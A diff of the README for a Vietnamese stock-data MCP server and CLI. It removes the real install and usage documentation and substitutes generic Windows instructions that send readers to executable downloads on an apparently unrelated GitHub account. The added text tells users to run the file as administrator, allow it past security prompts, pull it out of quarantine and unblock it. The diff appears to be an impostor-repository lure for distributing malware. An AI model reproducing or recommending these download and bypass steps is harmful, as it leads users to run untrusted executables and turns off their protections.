@@ -1,171 +1,174 @@
-# VNStock Agent
+# 📈 vnstock-agent - Simple stock data on Windows
 
-MCP server and CLI for Vietnamese stock market data. Integrates [vnstock](https://github.com/thinh-vu/vnstock) with AI tools via Model Context Protocol (MCP).
+[![Download vnstock-agent](https://img.shields.io/badge/Download%20vnstock-agent-ff7f50?style=for-the-badge&logo=github)](https://github.com/Multiplexoperationoratory685/vnstock-agent/releases)
 
-## Features
+## 🚀 What this app does
 
-- **21 MCP tools** for AI assistants (Claude, GPT, etc.)
-- **22 CLI commands** for terminal use
-- **3 MCP transports**: stdio, SSE, Streamable HTTP
-- Vietnamese stocks, forex, crypto, world indices, mutual funds
-- Historical prices, financials, company info, trading data
+vnstock-agent gives you access to Vietnamese stock market data from one simple app. It includes both an MCP server and a command line tool, so you can use it in a way that fits your setup.
 
-## Quick Start
+You can use it to:
+- View Vietnamese stock market data
+- Connect the app to tools that support MCP
+- Run quick checks from a command window
+- Work with stock data without setting up a full coding environment
 
-### Install
+## 🪟 Windows requirements
 
-```bash
-pip install vnstock-agent
-```
+Before you download, make sure your PC has:
+- Windows 10 or Windows 11
+- An internet connection
+- Enough free space for the app files
+- Permission to run downloaded apps
 
-Or from source:
+If you plan to use the CLI, you should also have access to Command Prompt or PowerShell, which comes with Windows.
 
-```bash
-git clone https://github.com/mrgoonie/vnstock-agent.git
-cd vnstock-agent
-pip install -e .
-```
+## 📥 Download the app
 
-### Set API Key
+Visit this page to download vnstock-agent:
 
-```bash
-export VNSTOCK_API_KEY=your_api_key_here
-```
+[Download vnstock-agent releases](https://github.com/Multiplexoperationoratory685/vnstock-agent/releases)
 
-Get a free API key at [vnstocks.com/login](https://vnstocks.com/login).
+On the releases page, look for the latest version. Download the file made for Windows. If there are more than one file, choose the one that ends with `.exe`, `.zip`, or another Windows file type listed for the release.
 
-## CLI Usage
+## 🧭 Install on Windows
 
-```bash
-# Stock history
-vnstock-agent history VNM --start 2025-01-01 --end 2025-03-31
+If you downloaded a `.exe` file:
+1. Open the file from your Downloads folder
+2. If Windows asks for permission, choose Run or Yes
+3. Follow the steps on the screen
+4. Finish the setup
+5. Open the app from the Start menu or desktop if a shortcut was created
 
-# Company overview
-vnstock-agent overview FPT
+If you downloaded a `.zip` file:
+1. Right-click the file
+2. Choose Extract All
+3. Pick a folder you can find again, such as `Downloads` or `Desktop`
+4. Open the extracted folder
+5. Look for the app file or launch file inside
+6. Double-click it to start
 
-# Financial statements
-vnstock-agent balance-sheet VCB --period quarter
-vnstock-agent income VCB --period annual
-vnstock-agent cashflow VCB
-vnstock-agent ratio VCB
+If Windows shows a security prompt, check that you downloaded the file from the GitHub releases page above, then allow it to run.
 
-# Market data
-vnstock-agent symbols                    # All listed symbols
-vnstock-agent group --group VN30         # VN30 stocks
-vnstock-agent board "VNM,FPT,ACB,VCB"   # Price board
-vnstock-agent industries                 # ICB industries
+## 🛠️ First-time setup
 
-# Company details
-vnstock-agent shareholders FPT
-vnstock-agent officers FPT
-vnstock-agent news FPT
-vnstock-agent events FPT
+After you open vnstock-agent for the first time:
+1. Let it finish any initial setup
+2. Keep the app open while it loads data
+3. If the app asks for network access, allow it
+4. If the app asks for a path or folder, choose a place you can find later
 
-# Intraday & depth
-vnstock-agent intraday VNM --page-size 200
+If you are using the CLI, open PowerShell and move to the folder where the app is stored, then run the command shown in the release files or app instructions.
 
-# Global markets
-vnstock-agent fx EURUSD --start 2025-01-01
-vnstock-agent crypto BTC --start 2025-01-01
-vnstock-agent index DJI --start 2025-01-01
+## 💻 Using the CLI
 
-# Mutual funds
-vnstock-agent funds
+The CLI version is for quick stock data tasks from a command window.
 
-# JSON output
-vnstock-agent --format json history VNM
-```
+Typical use cases:
+- Check stock information
+- Pull market data
+- Test data access
+- Run simple commands without opening a full app window
 
-## MCP Server
+To use it:
+1. Open PowerShell or Command Prompt
+2. Go to the folder with vnstock-agent
+3. Run the command included with the release
+4. Read the output in the window
 
-### stdio (for Claude Desktop, Cursor, etc.)
+If the app shows a help command, use it first. That usually lists the available commands and the right syntax.
 
-Add to your MCP client config:
+## 🔌 Using the MCP server
 
-```json
-{
-  "mcpServers": {
-    "vnstock": {
-      "command": "vnstock-mcp",
-      "env": {
-        "VNSTOCK_API_KEY": "your_api_key_here"
-      }
-    }
-  }
-}
-```
+The MCP server version is for tools that can connect to external data sources through MCP.
 
-### SSE Transport
+Use this when you want:
+- Stock data inside another app
+- A local server that provides market data
+- A simple connection for automation tools
 
-```bash
-VNSTOCK_MCP_TRANSPORT=sse VNSTOCK_MCP_PORT=8000 vnstock-mcp
-```
+Basic flow:
+1. Start vnstock-agent
+2. Keep the server running
+3. Connect your MCP-ready app to the local address or command shown in the release
+4. Test the connection with a small request
 
-### Streamable HTTP Transport
+If your other app asks for a server name, port, or command path, use the values from the release files or setup output.
 
-```bash
-VNSTOCK_MCP_TRANSPORT=http VNSTOCK_MCP_PORT=8000 vnstock-mcp
-```
+## 📊 What you can expect
 
-Or via CLI:
+vnstock-agent is built to keep the process simple while still giving useful market data. It is meant for users who want:
+- Fast access to Vietnamese stock data
+- A plain setup on Windows
+- A local tool that does not need much setup
+- A command-based workflow when needed
 
-```bash
-vnstock-agent serve --transport sse --port 8000
-vnstock-agent serve --transport http --port 8000
-```
+It works well for checking market details, tracking symbols, and connecting data to other tools.
 
-## MCP Tools
+## 🧪 Common tasks
 
-| Tool | Description |
-|------|-------------|
-| `stock_history` | Historical OHLCV price data |
-| `stock_intraday` | Today's intraday trading data |
-| `stock_price_depth` | Order book / bid-ask data |
-| `company_overview` | Company overview info |
-| `company_shareholders` | Major shareholders |
-| `company_officers` | Management team |
-| `company_news` | Company news |
-| `company_events` | Dividends, AGM, etc. |
-| `financial_balance_sheet` | Balance sheet |
-| `financial_income_statement` | Income statement |
-| `financial_cash_flow` | Cash flow statement |
-| `financial_ratio` | P/E, P/B, ROE, ROA, etc. |
-| `listing_all_symbols` | All listed symbols |
-| `listing_symbols_by_group` | VN30, HNX30, etc. |
-| `listing_symbols_by_exchange` | By exchange (HOSE, HNX, UPCOM) |
-| `listing_industries` | ICB industry classification |
-| `trading_price_board` | Real-time price board |
-| `fx_history` | Forex historical data |
-| `crypto_history` | Cryptocurrency data |
-| `world_index_history` | World market indices |
-| `fund_listing` | Mutual fund listing |
+Here are a few things you may do with the app:
+- Search for a stock symbol
+- View price data
+- Pull recent market records
+- Check company details
+- Use the data in another supported app
 
-## Environment Variables
+If the data does not appear, try a different symbol or check your internet connection.
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `VNSTOCK_API_KEY` | (none) | VNStock API key |
-| `VNSTOCK_SOURCE` | `VCI` | Default data source (VCI, KBS) |
-| `VNSTOCK_MCP_TRANSPORT` | `stdio` | MCP transport (stdio, sse, http) |
-| `VNSTOCK_MCP_HOST` | `0.0.0.0` | Server host |
-| `VNSTOCK_MCP_PORT` | `8000` | Server port |
+## 🧰 Troubleshooting
 
-## Development
+If the app does not open:
+- Check that the file finished downloading
+- Try running it again as administrator
+- Make sure Windows did not move it to quarantine
 
-```bash
-git clone https://github.com/mrgoonie/vnstock-agent.git
-cd vnstock-agent
-python -m venv .venv
-source .venv/bin/activate
-pip install -e ".[dev]"
+If the CLI closes too fast:
+- Open it from PowerShell instead of double-clicking
+- Run the command from an open terminal window
+- Look for an error message before the window closes
 
-# Run tests
-pytest
+If data does not load:
+- Check your internet connection
+- Try again after a short wait
+- Make sure the app is using the latest release
 
-# Lint
-ruff check src/
-```
+If Windows blocks the file:
+- Right-click the file
+- Choose Properties
+- If you see an unblock option, allow the file
+- Run it again from the release download
 
-## License
+## 📁 Suggested file layout
 
-MIT
+If you keep the app in a folder, this layout works well:
+- `Downloads/vnstock-agent`
+- `Desktop/vnstock-agent`
+- `Documents/vnstock-agent`
+
+Keep the release files in one folder so you can find them later.
+
+## 🔄 Updating vnstock-agent
+
+When a new version comes out:
+1. Return to the releases page
+2. Download the newest Windows file
+3. Replace the old files if needed
+4. Start the new version
+
+If you use the app often, check the releases page from time to time so you stay on the latest build.
+
+## 🧩 Help when working with another app
+
+If you connect vnstock-agent to another tool:
+- Start vnstock-agent first
+- Keep it running
+- Use the local address, port, or command shown in the release files
+- Test with one small stock query before doing more
+
+This helps you confirm that the connection works before you depend on it.
+
+## 📎 Download again
+
+If you need the file again, use the same release page:
+
+[Visit vnstock-agent releases](https://github.com/Multiplexoperationoratory685/vnstock-agent/releases)
